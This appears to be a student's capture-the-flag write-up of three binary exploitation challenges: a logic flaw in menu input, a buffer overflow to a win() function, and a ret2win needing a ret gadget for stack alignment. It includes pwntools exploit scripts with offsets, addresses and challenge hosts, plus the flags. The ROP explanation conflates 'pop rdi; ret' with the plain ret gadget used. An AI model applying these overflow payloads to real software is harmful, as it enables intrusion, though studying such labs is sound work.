# 1. Immadev 

---

##  Challenge Description

> Logic based exploitation

---

##  Files Provided

- `ImmaDeveloper` – ELF 64-bit binary


```bash
garri@LAPTOP-J4CRR4GO:/mnt/c/Users/garri/Desktop/JTP-2/binex/immadev/src$ ./ImmaDeveloper
Hi I'm sudonymouse!
I'm learning development, checkout this binary!
Option 1: Hello <USER>
Option 2: Flag(maybe?)
Option 3: Log into my binary!
```
## Initial Recon
> 1.Running the elf file and analysing the output <br>
> 2. File gives user 3 options to deal with <br>
> 3. Seeing what the options do<Br>
> 4. Program is made so that user is not able to run the printflag() function just by selecting "2" as a prompt<br>

## Vulnerability analsyis
> 1. Opening the file in IDA<br>
>  <img width="1069" height="494" alt="image" src="https://github.com/user-attachments/assets/7cea639d-56bf-4124-a15d-6963a14f12af" /> <br>
> 2. After user input handleoption() is called <Br>
>  <img width="695" height="692" alt="image" src="https://github.com/user-attachments/assets/771ef596-3a7b-467c-99e5-c31f15a7c506" /> <Br>
> 4. The program is designed to store user input as an array, and loop through the respective options<br>
> 5. printFlag() func will not be called if "2" is the first element of the user<br>
> 6. The input prompt (v1) should follow the constraints v1>0 v1<=3 <br>

## Exploit strat
> Sending input with "2" not as the first element, so anything like "123" "321" "!23" will work and print the flag

```
## Flag: nite{n0t_4ll_b1n3x_15_st4ck_b4s3d!}
```

# 2. Performative

---

##  Challenge Description

> Buffer overflow

---

##  Files Provided

- `perf` – ELF 64-bit binary


```bash
### Welcome to the performative male/female parade! ###

Yk what performative people like? just a plain ol' bof!

Lets just generate a buffer then ig?

Buffer: woahwoahWOHHAH OHAHAHAO
Generating your buffer...

Your custom buffer:
========================
```
## Initial Recon
> 1.Running the elf file and analysing the output <br>
> 2. File prompts user to enter a buffer <br>
> 3. Clearly hinting towards a buffer overflow <Br>
> 4. The program returns prints the input string <br>

## Vulnerability analsyis
> 1. Opening the file in IDA<br>
 <img width="685" height="372" alt="image" src="https://github.com/user-attachments/assets/34c1fcb6-49b6-4b84-a423-1168499a1de9" />
<br>
> 2. analyzing win() in the disassembler<Br>
 <img width="522" height="216" alt="image" src="https://github.com/user-attachments/assets/eb3ccc51-a162-42a9-ac18-d1f973e07d5e" />
 <Br>
> 3. The program will print the flag when we execute the win() func using buffer overflow<br>


## Exploit strat
> 1. Finding the padding/offset via De brujn's sequence or eyeballing <br>
> 2. packing the address of win() func to maintain endian-ness<Br>
> 3. Sending payload to the executable , locally and remotely

### Exploit script
```python
from pwn import *

context.binary = "./perf"
context.arch = "amd64"
context.log_level = "info"

OFFSET = 40
PRINTFLAG = 0x4011E9

REMOTE_HOST = "performative.nitephase.live"
REMOTE_PORT = 56743

def main():
    p = remote(REMOTE_HOST, REMOTE_PORT)
    log.info("Connected to remote server")
    
    payload = b"A" * OFFSET + p64(PRINTFLAG)
    
   
    p.sendlineafter(b"Buffer:", payload)

    p.interactive()

if __name__ == "__main__":
    main()
```

```
## Flag: nite{th3_ch4l_4uth0r_15_4nt1_p3rf0rm4t1v3}
```
# 3. Property in Manipal

---

##  Challenge Description

> ROP

---

##  Files Provided

- `manipal` – ELF 64-bit binary


```bash
garri@LAPTOP-J4CRR4GO:/mnt/c/Users/garri/Desktop/JTP-2/binex/property/src$ ./manipal
I bought a property in Mandavi
& what they do for you is,
they give you the property.
Enter your name to signup for the property: moo
Hello, moo
�
Enter the amount for customizations: 1212
```
## Initial Recon
> 1.Running the elf file and analysing the output <br>
> 2. File prompts user to enter inputs <br>
> 3. At first glance feels like another buffer overflow <Br>
> 4. The program returns prints the input (name)string <br>
> 5. Running checksec commands to see what protections are enabled

## Vulnerability analsyis
> 1. Opening the file in IDA<br>
<img width="757" height="230" alt="image" src="https://github.com/user-attachments/assets/a782aaed-fc98-4e91-bae6-a3782002778e" />

<br>
> 2. analyzing vuln() in IDA<Br>
<img width="616" height="336" alt="image" src="https://github.com/user-attachments/assets/3b1f8fd5-ab68-478a-87ea-7447147542d9" />

 <Br>
> 3. Plain old buffer overflow it is. Or is it?


## Exploit strat
> 1. Finding the padding/offset via De brujn's sequence or eyeballing <br>
> 2. packing the address of win() func to maintain endian-ness<Br>
> 3. Sending payload to the executable , locally and remotely<br>

# Note:
- We encounter an error if we proceed according to this strat
- The program segafaults but why?
- Stack misalignment
- Stack needs to be 16bit aligned
- When we simply overflow the stack we end up messing up the stack structure and register values making the stack look like a "murder scene" , chaotic.
- We need to fix this error by aliging the stack . "Rudimentary" application of ROP.

### Exploit script
```python
#!/usr/bin/env python3
from pwn import *

binary_path = './manipal'
win_addr = 0x401196
ret_gadget = 0x40101a

context.arch = 'amd64'
context.log_level = 'info'

if args.REMOTE:
    io = remote('propertyinmanipal.nitephase.live', 42586)
else:
    io = process(binary_path)

io.recvuntil(b'Enter your name to signup for the property: ')
io.sendline(b'TestUser')

io.recvuntil(b'Enter the amount for customizations: ')

payload = b'A' * 72 + p64(ret_gadget) + p64(win_addr)
io.sendline(payload)

io.interactive()
```
## Why this works?
> We using functions inside the pwntools library to find return gadgets so we can align the stack using ROP
> The most basic ROP gadget is<br>
```
pop rdi;ret
```
> This return gadgets pops 8 bytes from the top of the stack and stores them in the rdi register<br>
> Also moves rsp forward by 8 bytes and returns to the stack <Br>
> this way we can effectively fix stack misalignment without segfault<Br>
- To summarize
  > We use gadgets like pop rdi; ret to prepare registers (like RDI for arg1) and advance the stack (RSP), so that when execution ret jumps into the target function, it sees valid arguments, aligned stack, and a proper return address.
```
## Flag: nite{ch0pp3d_ch1n_r34lly_m4d3_2025_p34k_f0r_u5} 
```
## Resources:
Suraj my goat ^^





